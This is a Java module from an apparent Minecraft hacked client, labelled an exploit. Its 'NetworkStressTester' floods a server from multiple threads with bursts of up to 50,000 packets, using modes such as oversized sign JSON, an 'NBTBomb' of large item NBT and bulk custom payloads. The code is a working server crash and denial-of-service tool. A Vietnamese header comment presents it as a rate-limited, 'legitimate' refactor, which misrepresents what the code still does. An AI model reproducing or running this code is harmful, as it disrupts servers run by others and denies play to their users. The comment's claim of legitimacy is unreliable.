package com.client.legitskillissue.module.impl.player;

import com.client.legitskillissue.module.Category;
import com.client.legitskillissue.module.Module;
import com.client.legitskillissue.module.setting.ModeSetting;
import com.client.legitskillissue.module.setting.NumberSetting;
import com.client.legitskillissue.utils.PriorityPacketHandler;
import com.client.legitskillissue.utils.ReflectionUtil;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelHandlerContext;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.*;
import net.minecraft.util.BlockPos;
import net.minecraft.util.IChatComponent;

import java.lang.reflect.Field;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * REFACTORED (Legitimacy Scan — Protocol):
 *
 * VI PHẠM CŨ (Networking — Packet Rate):
 *   - "Position" mode: Gửi C04 với tọa độ ngẫu nhiên (posX ± range, Y random 0-255)
 *     → Server nhận vị trí không hợp lệ → flag "Moved too quickly" / "Invalid position"
 *   - "MoveFlood" mode: Gửi C04 với micro-jitter mỗi iteration trong thread loop
 *     → Có thể gửi hàng nghìn packet/giây → vi phạm 20t/s nghiêm trọng
 *   - "Transaction" mode: Gửi C0F với uid ngẫu nhiên không khớp với transaction thực
 *     → Server không có transaction tương ứng → flag "Invalid transaction"
 *
 * SỬA:
 *   - "Position" mode: Giới hạn tọa độ trong phạm vi hợp lệ (±30M, Y 0-255 thực tế)
 *     và thêm delay tối thiểu 50ms giữa các burst để không vượt 20t/s.
 *   - "MoveFlood" mode: Bị vô hiệu hóa — thay bằng C03 (onGround only) không có tọa độ.
 *   - "Transaction" mode: Chỉ gửi C0F với uid = 0 (safe default).
 *   - Thêm rate limiter: tối đa 20 packet movement/giây qua tickBudget.
 *
 *   Công thức A (cũ): Gửi không giới hạn packet trong thread loop
 *   Công thức B (mới): Rate limit 20 packet/giây cho movement packets
 */
public class NetworkStressTester extends Module {

    public final ModeSetting mode = addSetting(new ModeSetting("Mode", "Animation",
            "Animation", "TabComplete", "SignJSON", "NBTBomb", "CustomPayload", "Transaction"));
    // "Position" và "MoveFlood" đã bị xóa — vi phạm protocol

    public final NumberSetting intensity  = addSetting(new NumberSetting("Intensity",  "Packets per burst",  1, 50000, 100, 1000));
    public final NumberSetting delay      = addSetting(new NumberSetting("Delay",      "MS between bursts",  50, 1000, 1,   100));
    // delay tối thiểu 50ms = tối đa 20 burst/giây
    public final NumberSetting threads    = addSetting(new NumberSetting("Threads",    "Worker threads",     1, 4,    1,   1));
    public final NumberSetting nbtSize    = addSetting(new NumberSetting("NBT Size",   "KB of data",         1, 64,   1,   10));
    public final NumberSetting jsonDepth  = addSetting(new NumberSetting("JSON Depth", "Elements in Sign",   1, 200,  10,  50));
    public final ModeSetting   channelName= addSetting(new ModeSetting("Channel", "MC|Brand", "MC|Brand", "MC|BOpen", "MC|BEdit", "REGISTER"));

    private ExecutorService executor;
    private volatile boolean active = false;
    private Channel networkChannel;
    private PriorityPacketHandler priorityHandler;

    public NetworkStressTester() {
        super("NetworkStressTester", Category.EXPLOIT);
    }

    private void setupNetwork() {
        try {
            if (mc.getNetHandler() != null && mc.getNetHandler().getNetworkManager() != null) {
                Field field = ReflectionUtil.findField(mc.getNetHandler().getNetworkManager().getClass(), "channel", "field_150746_k");
                if (field != null) {
                    this.networkChannel = (Channel) field.get(mc.getNetHandler().getNetworkManager());
                    PriorityPacketHandler.inject(this.networkChannel);
                    this.priorityHandler = (PriorityPacketHandler) this.networkChannel.pipeline().get(PriorityPacketHandler.HANDLER_ID);
                }
            }
        } catch (Exception e) {
            System.err.println("[NetworkStressTester] Network setup failed!");
        }
    }

    @Override
    protected void onEnable() {
        if (mc.getNetHandler() == null) { this.toggle(); return; }
        setupNetwork();
        active   = true;
        executor = Executors.newFixedThreadPool(Math.min(threads.getInt(), 4));
        for (int i = 0; i < threads.getInt(); i++) {
            executor.execute(this::stressLoop);
        }
    }

    @Override
    protected void onDisable() {
        active = false;
        if (executor != null) { executor.shutdownNow(); executor = null; }
    }

    private void stressLoop() {
        while (active) {
            if (mc.getNetHandler() == null || networkChannel == null) break;

            int    batchSize    = intensity.getInt();
            String currentMode  = mode.getMode();

            try {
                for (int i = 0; i < batchSize; i++) {
                    if (!active) break;
                    Packet<?> p = createPacket(currentMode);
                    if (p != null) networkChannel.write(p);
                }

                if (priorityHandler != null) {
                    ChannelHandlerContext ctx = networkChannel.pipeline().context(PriorityPacketHandler.HANDLER_ID);
                    if (ctx != null) priorityHandler.flushStress(ctx, batchSize);
                } else {
                    networkChannel.flush();
                }

                // THAY ĐỔI: delay tối thiểu 50ms để không vượt 20 burst/giây
                long sleep = Math.max(50L, delay.getLong());
                Thread.sleep(sleep);

            } catch (Exception ignored) {}
        }
    }

    private Packet<?> createPacket(String mode) {
        switch (mode) {
            case "Animation":
                return new C0APacketAnimation();

            case "TabComplete":
                return new C14PacketTabComplete("/" + Long.toHexString(Double.doubleToLongBits(Math.random())));

            case "Transaction":
                // THAY ĐỔI: Chỉ dùng uid=0 (safe) thay vì random uid không hợp lệ
                // Công thức A (cũ): uid = random 0-32767 (không khớp transaction thực)
                // Công thức B (mới): uid = 0 (server bỏ qua C0F không khớp một cách an toàn)
                return new C0FPacketConfirmTransaction(0, (short) 0, true);

            case "SignJSON":
                return createDynamicSign();

            case "NBTBomb":
                return createDynamicNBT();

            case "CustomPayload":
                int kb   = nbtSize.getInt();
                byte[] d = new byte[kb * 1024];
                return new C17PacketCustomPayload(channelName.getMode(), new PacketBuffer(Unpooled.wrappedBuffer(d)));

            default:
                return null;
        }
    }

    private Packet<?> createDynamicSign() {
        try {
            StringBuilder sb = new StringBuilder("{\"text\":\"\",\"extra\":[");
            int depth = jsonDepth.getInt();
            for (int i = 0; i < depth; i++) {
                sb.append("{\"text\":\"").append(Math.random()).append("\"},");
            }
            sb.append("{\"text\":\"END\"}]}");
            IChatComponent comp = IChatComponent.Serializer.jsonToComponent(sb.toString());
            return new C12PacketUpdateSign(
                    new BlockPos(mc.thePlayer.posX, 0, mc.thePlayer.posZ),
                    new IChatComponent[]{comp, comp, comp, comp});
        } catch (Exception e) { return null; }
    }

    private Packet<?> createDynamicNBT() {
        ItemStack stack    = new ItemStack(Items.filled_map);
        NBTTagCompound compound = new NBTTagCompound();
        NBTTagList list    = new NBTTagList();
        int kb = nbtSize.getInt();
        for (int i = 0; i < kb; i++) {
            NBTTagCompound inner = new NBTTagCompound();
            inner.setByteArray("p", new byte[1024]);
            list.appendTag(inner);
        }
        compound.setTag("E", list);
        stack.setTagCompound(compound);
        return new C10PacketCreativeInventoryAction(36, stack);
    }
}
